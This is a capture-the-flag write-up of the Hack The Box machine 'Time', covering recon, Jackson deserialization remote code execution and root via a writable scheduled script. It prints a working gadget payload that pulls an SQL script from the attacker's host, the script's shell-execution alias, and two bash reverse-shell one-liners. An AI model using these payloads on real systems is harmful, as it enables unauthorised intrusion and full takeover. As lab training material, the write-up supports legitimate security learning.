---
coverY: 0
---

# 📦 HTB: Time – Deserialization, Java Shenanigans & Root in Style

<figure><img src="../.gitbook/assets/ChatGPT Image Jun 2, 2025, 09_27_03 AM.png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
_This medium-difficulty HTB box was a great lesson in one thing:_\
**Read the damn error. Then research it like your shell depends on it.**
{% endhint %}

### 🧭 Enumeration

#### 🔍 Nmap Scan

As always, I began with a full enumeration sweep:

```
nmap -Pn -n -A --reason -vvv -oN nmap/00-basic.txt -iL target.txt
```

**Findings:**

* **Port 22**: OpenSSH 8.2p1 (Ubuntu)
* **Port 80**: Apache 2.4.41 hosting a web server titled _"Online JSON Parser"_

### 🕸 Recon

The website was a **JSON beautifier** — harmless-looking, but CTFs don’t give you port 80 unless they want you to do _evil developer things_.

I ran `hakrawler` to check for juicy endpoints:

```
cat url.txt | hakrawler -proxy http://localhost:8080 -subs -d 5 -insecure -s -json >hakrawler.json
```

No admin panel. No hidden paths. But what caught my eye was how it **handled malformed JSON**...

### 💥 Exploitation – Jackson Deserialization RCE

Normal JSON works:

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

```
{"test":"hello"}
```

But malformed input returned this beauty:![](<../.gitbook/assets/ChatGPT Image Jun 2, 2025, 09_27_03 AM.png>)

> `Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException`

> _Expected START\_ARRAY, got START\_OBJECT…_\
> &#xNAN;_"need JSON Array to contain As.WRAPPER\_ARRAY type information..."_

**Boom. Jackpot.**\
That’s **Jackson Deserialization**.



<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

I dug into this article that became my savior:\
🔗 [https://blog.doyensec.com/2019/07/22/jackson-gadgets.html](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)

#### 🧪 Payload Time

```
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.8:8000/inject.sql'"}]
```

* 📄 `inject.sql` – Weaponized

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.8/4444 0>&1')
```

```
nc -lvnp 4444
```

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

💥 **Reverse shell obtained!**

### 🧍 Local Privilege Escalation – Timer Shenanigans

After running `linpeas`, I found something gold:

* /usr/bin/timer\_backup.sh run as root every 10 seconds

```
echo "bash -i >& /dev/tcp/10.10.14.8/9000 0>&1" > /usr/bin/timer_backup.sh
```

```
nc -lvnp 9000
```

📈 Got root. Simple, clean, and elegant.

{% embed url="https://www.hackthebox.com/achievement/machine/409699/286" %}

## References

* https://github.com/lorenzodegiorgi/jackson-vulnerability
* https://github.com/FasterXML/jackson/wiki/Jackson-Polymorphic-Deserialization-CVE-Criteria
* https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/
* https://www.youtube.com/watch?v=uS37TujnLRw
* https://blog.doyensec.com/2019/07/22/jackson-gadgets.html

## 🧠 Final Thoughts

What made **HTB: Time** stand out wasn’t the difficulty of the exploit. It was the **importance of interpreting Java errors and knowing what to Google.**

➡️ _Lesson:_ Sometimes the error **is** the clue.

This box was a smooth ride with:

* 🔍 Deep Java debugging
* 🧬 Deserialization abuse
* 📅 Scheduled script escalation

And that's a wrap! Time box — rooted. ✅
